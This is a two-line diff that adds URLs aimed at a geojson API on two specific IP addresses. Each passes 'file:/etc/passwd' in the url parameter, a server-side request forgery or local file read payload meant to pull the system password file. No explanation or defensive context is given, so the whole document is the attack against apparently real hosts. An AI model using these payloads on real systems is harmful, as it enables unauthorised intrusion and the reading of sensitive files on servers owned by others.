@@ -1,0 +1,2 @@
+http://104.248.107.82:3000/api/geojson?url=file:/etc/passwd
+http://68.183.199.243:3000/api/geojson?url=file:/etc/passwd
